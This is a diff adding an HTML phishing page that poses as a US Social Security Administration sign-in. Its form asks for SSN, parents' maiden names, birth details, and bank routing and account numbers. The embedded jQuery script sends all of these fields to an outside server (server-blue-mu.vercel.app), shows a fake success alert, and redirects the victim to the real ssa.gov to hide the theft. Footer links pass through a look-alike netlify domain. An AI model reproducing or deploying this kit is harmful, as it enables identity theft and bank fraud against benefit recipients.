@@ -1,0 +1,165 @@
+
+
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="./newssn/index.css">
+   
+
+</head>
+<body>
+    <div>
+        <header>
+                    <img src="./newssn/images/ssalogo.png">
+        </header>
+        <p>Sign In</p>
+        
+        <p>If you have created an account <b>before</b> September 18, 2021, fill in every information correctly</p>	
+        <form method="post" id="myForm"> 
+            <label for="full-name">Full Name</label></br>
+            <input required type="text" name="name" class="blanks" id="full-name"><br/>
+            
+            <label for="ssn">SSN</label></br>
+            <input required type="text" class="blanks" id="ssn"/><br/>
+            
+            <label for="mailing-address">Mailing Address On Profile</label></br>
+            <input required type="text" class="blanks" id="mailing-address"/><br/>
+
+            <label for="fathers">Fathers Full Name and Maiden Name</label></br>
+            <input required id="fathers" type="text" class="blanks"/><br/>
+
+            <label for="mothers">Mother's Full Name And Maiden Name</label></br>
+            <input required id="mothers" type="text" class="blanks"/><br/>
+
+            <label for="pob">Place Of birth(City and state)</label></br>
+            <input required id="pob" type="text" class="blanks"/><br/>
+            
+            
+            <label for="state">State</label></br>
+            <input required id="state" type="text" class="blanks"/><br/>
+            
+            <label for="amount">Amount Received Last Month (In USSD)</label></br>
+            <input required id="amount" type="text" class="blanks"/><br/>
+
+            <label for="routing">Routing Number That's On File</label></br>
+            <input required id="routing" type="text" class="blanks"/><br/>
+
+            <label for="account">Account Number That's On File</label></br>
+            <input required id="account" class="blanks"/><br/>
+
+            <label for="phone">Phone Number</label></br>
+            <input required id="phone" type="text" class="blanks"/><br/>
+
+
+            <label for="yes">Did You Receive SSA (YES or NO) </label></br>
+            <select required id="yes" type="text" class="select">
+              <option>Yes</option>
+              <option>No</option>
+              </select><br/>
+
+            <label for="dob">DOB (DD/MM/YYYY)</label></br>
+            <input required id="dob" type="text" class="blanks"/><br/>
+
+            <label for="dop">Date Of Payment</label></br>
+            <input required id="dop" type="text" class="blanks"/><br/>
+
+
+            <button type="submit" class="button">Submit</button>
+
+
+        </form>
+        <footer>
+            <p>Are you now, or have you ever been a victim of domestic violence? Identity theft? Do you have other concerns?
+            </p>
+            <p>You can contact us to block electronic access to your information at any time, for any reason.</p>
+            <div class="links">
+                <a href="https://ssagovclaim.netlify.app/external.html?link=https://secure.ssa.gov/rome/rir-ui/helpPrivacyAndSecurity"> Privacy and Security</a>
+                <a href="https://ssagovclaim.netlify.app/external.html?link=http://www.socialsecurity.gov/agency/privacy.html">Privacy Policy</a>
+                <a href="https://ssagovclaim.netlify.app/external.html?link=https://secure.ssa.gov/rome/rir-ui/helpPrivacyActStatement">Privacy Act Statement</a>
+            </div>
+        </footer>
+    </div>
+    <script src="./newssn/jquery-3.6.0.min.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+    <script>
+        
+        $(document).ready(function () {
+          $('#myForm').on('submit', function (event) {
+            event.preventDefault(); // Prevent the default form submission
+        
+    // Collect form data
+    var fullName = $('#full-name').val();
+    var ssn = $('#ssn').val();
+    var mailingAddress = $('#mailing-address').val();
+    var fathersName = $('#fathers').val();
+    var mothersName = $('#mothers').val();
+    var placeOfBirth = $('#pob').val();
+    var state = $('#state').val();
+    var amountReceived = $('#amount').val();
+    var routingNumber = $('#routing').val();
+    var accountNumber = $('#account').val();
+    var phoneNumber = $('#phone').val();
+    var receivedSSA = $('#yes').val();
+    var dob = $('#dob').val();
+    var dateOfPayment = $('#dop').val();
+
+    // Build the data object
+    var data = {
+        fullName: fullName,
+        ssn: ssn,
+        mailingAddress: mailingAddress,
+        fathersName: fathersName,
+        mothersName: mothersName,
+        placeOfBirth: placeOfBirth,
+        state: state,
+        amountReceived: amountReceived,
+        routingNumber: routingNumber,
+        accountNumber: accountNumber,
+        phoneNumber: phoneNumber,
+        receivedSSA: receivedSSA,
+        dob: dob,
+        dateOfPayment: dateOfPayment
+    }
+
+            $.ajax({
+              url: 'https://server-blue-mu.vercel.app/ssnsenderjullish', // Replace with the URL to your PHP handler script
+              type: 'POST',
+              data: JSON.stringify(data),
+              contentType: 'application/json',
+              success: function (response) {
+                console.log(response);
+                swal("Application submitted successfully!", "", "success").then(() => {
+                    window.location.href = "https://ssa.gov/";        });
+              },
+              error: function (xhr, status, error) {
+                // Handle any errors
+                swal("An error occurred while saving the application!", "", "warning");
+                console.error(xhr.responseText);
+              }
+            });
+          });
+        });
+        
+        </script>
+                <!-- TM Floodlight Tag -->
+
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/650ae23bb1aaa13b7a77e62a/1hap87eq3';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script>
+    <!--End of Tawk.to Script-->
+</body>
+
+
+</html>
